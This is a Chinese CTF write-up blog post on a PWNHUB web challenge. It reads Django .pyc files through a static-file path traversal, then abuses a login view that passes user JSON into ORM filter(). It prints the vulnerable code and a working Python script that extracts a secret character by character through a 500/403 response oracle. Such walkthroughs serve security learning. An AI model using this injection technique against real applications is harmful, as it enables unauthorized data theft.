---
id: 755
layout: post
title: 'PWNHUB Web第一题writeup'
date: 2016-12-05 20:04:00
author: virusdefender
tags: 
---

题目地址 http://54.223.46.206:8003/

首先在HTTP头中可以看到`Server:gunicorn/19.6.0 Django/1.10.3 CPython/3.5.2`，引用的站内资源只有一个js，然后回想起ph师傅的写过的Python Web安全的文章 http://www.lijiejie.com/python-django-directory-traversal/ ，发现在处理静态文件的时候有一个任意文件读取，但是任何`.py`结尾的文件都会提示403，其他的不会，考虑读取`pyc`，看了下自己的Django项目，Python 3.5的`pyc`都是在一个`__pycache__`目录中的，然后是`xxx.cpython-35.pyc`的文件名。

Django是一个MVC框架，默认的主要代码都在`models.py`和`views.py`，成功的得到pyc。然后使用`unpyc3` https://github.com/figment/unpyc3 得到了源码。

核心代码如下

```python
class StaticFilesView(generic.View):
    content_type = 'text/plain'

    def get(self, request, *args, **kwargs):
        filename = self.kwargs['path']
        # 任意文件读取就是这里
        filename = os.path.join(settings.BASE_DIR, 'students', 'static', filename)
        (name, ext) = os.path.splitext(filename)
        if ext in ('.py', '.conf', '.sqlite3', '.yml'):
            raise exceptions.PermissionDenied('Permission deny')
        try:
            return HttpResponse(FileWrapper(open(filename, 'rb'), 8192), content_type=self.content_type)
        except BaseException as e:
            raise Http404('Static file not found')
            
class LoginView(JsonResponseMixin, generic.TemplateView):
	template_name = 'login.html'
	def post(self, request, *args, **kwargs):
		data = json.loads(request.body.decode())
		stu = models.Student.objects.filter(**data).first()
		if not stu or stu.passkey != data['passkey']:
			return self._jsondata('', 403)
		else:
			request.session['is_login'] = True
			return self._jsondata('', 200)

class Student(models.Model):
    name = models.CharField('姓名', max_length=64, unique=True)
    no = models.CharField('学号', max_length=12, unique=True)
    passkey = models.CharField('密码', max_length=32)
    group = models.ForeignKey('Group', verbose_name='所属班级', on_delete=models.CASCADE, null=True, blank=True)


class Group(models.Model):
    name = models.CharField('班级名', max_length=64)
    information = models.TextField('介绍')
    secret = models.CharField('内部信息', max_length=128)
    created_time = models.DateTimeField('创建时间', auto_now_add=True)
```

可以看到直接将用户发送的数据作为filter的条件传递了，如果用户存在，而data中没有`passkey`就会造成500，如果用户不存在就会403，所以可以使用Django中的like查询。它的特点就是字段名后面添加两个下划线，接着才是搜索条件，可以作为参数传给filter。

```python
# 精确查询 where name="test"
Student.objects.filter(name="test")

# 按照字符串开头查询 where name="test%"
Student.objects.filter(name__startswith="test")

# 按照字符串包含查询 where name="%test%"
Student.objects.filter(name__contains="test")
```

其实这里还有个坑，但是后来给ph师傅说了之后还是填上了，防止题目过于难，就是这里Django使用的是sqlite3数据库，而sqlite3的like是不区分大小写的，而数据库里面存的确实是大小写混合的，然而实际上还是有两个解决方案的

  - 爆破，12位密码去除数字，实际组合是`2^10`左右，也并不大
  - 使用sql中的正则，类似`Studdent.objects.filter(name__regex="test")`，这样就和区分大小写的`contains`是一样的了。

当然这个问题并不需要用户的密码，使用相同的方式去获取secret就好了。语句是`Student.objects.filter(group__secret__contains="pwnhub")`。最终利用的代码是
 
```python
import requests
import json

import string
d = string.printable

passkey = "pwnhub"

while True:
    for item in d:
        r = requests.post("http://54.223.46.206:8003/login/", data=json.dumps({"group__secret__contains": passkey + item}))
        if r.status_code == 500:
            passkey += item
            print(passkey)
            break
    else:
        exit()
```

